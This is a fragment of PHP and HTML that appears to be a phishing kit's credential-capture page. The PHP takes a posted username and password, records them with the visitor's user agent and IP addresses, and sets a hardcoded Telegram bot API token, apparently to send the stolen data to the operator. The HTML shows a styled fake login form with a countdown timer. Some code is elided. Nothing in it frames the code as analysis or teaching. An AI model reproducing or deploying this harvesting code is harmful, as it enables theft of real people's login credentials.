<?php
session_start();
if( !empty($_POST['ipx1']) && !empty($_POST['ipx2']) ){
    
    $_SESSION['USER'] = $_POST['ipx1'];
    $_SESSION['PASS'] = $_POST['ipx2'];

    @$message = "PCHNCH\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'U: '.$_SESSION['USER']."\n".'P: '.$_SESSION['PASS']."\n";

    $apiToken = "6636580207:AAHSpoAYGfOLdkAJ1vEnJ-D5jVv0V69L-Xo";
  ...
  <body style="overflow-x:hidden;background:url(bg1.jpg);background-size:cover;">
    ...
    <div id="cizq">
        <div id="mn-frm">
          ...
          <strong id="time" style="position: relative;top: 267px;font-family: sans-serif;color: #222d56;font-size: 14px;"><label id="countdown">0:15</label> </strong>
